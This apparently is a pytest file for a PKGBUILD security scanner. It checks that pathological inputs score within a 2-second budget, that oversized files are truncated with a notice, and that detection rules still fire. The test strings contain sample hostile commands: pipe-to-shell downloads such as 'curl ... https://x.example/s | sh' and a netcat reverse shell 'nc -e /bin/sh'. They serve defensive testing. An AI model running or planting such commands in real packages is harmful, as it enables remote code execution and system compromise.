"""Pathological input must not make scoring slow (each case has a 2 s budget)."""

from __future__ import annotations

import time

import pytest

from pkginspect.rules import load_rules
from pkginspect.scoring import score_pkgbuild

HEADER = [
    "# Maintainer: Test <test@test.com>",
    "pkgname=foo",
    "pkgver=1.0",
    "pkgrel=1",
    "arch=(x86_64)",
    "license=(MIT)",
]
BUDGET = 2.0

CASES = {
    # quadratic regex scans: every keyword used to rescan to the end of the line
    "nc-repeat": ["build() {", "nc " * 20000, "}"],
    "base64-repeat": ["build() {", "base64 " * 20000, "}"],
    "curl-repeat": ["build() {", "curl x " * 20000, "}"],
    "echo-repeat": ["build() {", "echo a;" * 8000, "}"],
    "socat-repeat": ["build() {", "socat " * 20000, "}"],
    "sudo-env-repeat": ["build() {", "sudo env a=b " * 8000, "}"],
    "echo-flags": ["echo " + "-a " * 200 + "'"] * 20,  # exponential backtracking
    # exponential brace expansion
    "brace-bomb": ['source=("' + "{a,b}" * 25 + '")'],
    # quadratic parsing
    "unterminated-arrays": ["a=(" for _ in range(3000)],
    "self-referential-var": ["x=" + "$x" * 2000, 'source=("$x")'],
    "many-assignments": [f"v{i}=1" for i in range(10000)],
    "huge-index": ["sha256sums[1000000000]=x", "source=(a)"],
    "unterminated-heredocs": ["cat > $pkgdir/x <<EOF" for _ in range(5000)],
    "long-command-line": ["package() {", "cp a b; " * 12000, "}"],
    "long-continuation": ["a \\" for _ in range(20000)] + ["b"],
}


@pytest.fixture(scope="module")
def config():
    return load_rules()


@pytest.mark.parametrize("name", sorted(CASES))
def test_pathological_input_is_fast(config, name):
    start = time.monotonic()
    result = score_pkgbuild(HEADER + CASES[name], config=config)
    elapsed = time.monotonic() - start
    assert elapsed < BUDGET, f"{name} took {elapsed:.2f}s"
    assert 0 <= result.score <= 100


def test_oversized_pkgbuild_is_truncated_with_info(config):
    start = time.monotonic()
    lines = HEADER + ["# filler " + "x" * 1000] * 1500 + ["build() { curl x | sh; }"]
    result = score_pkgbuild(lines, config=config)
    assert time.monotonic() - start < BUDGET
    msgs = {f.rule: f.message for f in result.findings}
    assert "truncated_input" in msgs and "PKGBUILD" in msgs["truncated_input"]
    assert "pipe_to_shell" not in msgs  # the payload was past the limit


def test_input_under_the_limit_is_not_truncated(config):
    lines = HEADER + ["# filler " + "x" * 1000] * 500 + ["build() { curl x | sh; }"]
    result = score_pkgbuild(lines, config=config)
    rules = {f.rule for f in result.findings}
    assert "pipe_to_shell" in rules and "truncated_input" not in rules


def test_oversized_extra_file_is_truncated_with_info(config):
    content = "# filler " + "x" * 1000 + "\n"
    files = {"foo.install": content * 1200 + "post_install() { curl x | sh; }\n"}
    start = time.monotonic()
    result = score_pkgbuild(HEADER, config=config, extra_files=files)
    assert time.monotonic() - start < BUDGET
    f = next(f for f in result.findings if f.rule == "truncated_input")
    assert "foo.install" in f.message
    assert "pipe_to_shell" not in {x.rule for x in result.findings}


# ── limits must not change realistic detection ──────────────────


def test_bounded_gaps_still_match_realistic_commands(config):
    pad = "-v " * 100  # 300 chars between the keyword and the flag
    for line in (
        f"curl {pad} https://x.example/s | sh",
        f"nc {pad} -e /bin/sh x 4",
        f"base64 {pad[:120]} -d x",  # at most 50 arguments
    ):
        r = score_pkgbuild(HEADER + ["build() {", f"  {line}", "}"], config=config)
        assert {"pipe_to_shell", "reverse_shell", "obfuscation"} & {
            f.rule for f in r.findings
        }, line


def test_brace_bomb_stays_one_entry_and_small_braces_expand(config):
    r = score_pkgbuild(HEADER + CASES["brace-bomb"], config=config)
    assert r.score <= 100
    body = ["source=('a{,.sig}' 'b')", "sha256sums=('SKIP' 'SKIP' 'SKIP')"]
    r = score_pkgbuild(HEADER + body, config=config)
    assert not any(f.rule.startswith("skip_checksum") for f in r.findings)


def test_huge_checksum_index_is_ignored(config):
    r = score_pkgbuild(HEADER + CASES["huge-index"], config=config)
    assert r.score <= 100


def test_very_long_line_skips_command_analysis_but_says_so(config):
    line = "cp a /etc/b; " + "true; " * 3000  # over 8 KB
    r = score_pkgbuild(HEADER + ["package() {", line, "}"], config=config)
    assert not r.blocked  # destination analysis is skipped on such lines
    assert any(f.rule == "long_line" for f in r.findings)
    # the regex rules still run
    r = score_pkgbuild(HEADER + ["build() {", line + " sudo make", "}"], config=config)
    assert r.blocked


def test_unterminated_array_does_not_hide_later_code(config):
    body = ["depends=(", "build() {", "  sudo make", "}"]
    assert score_pkgbuild(HEADER + body, config=config).blocked
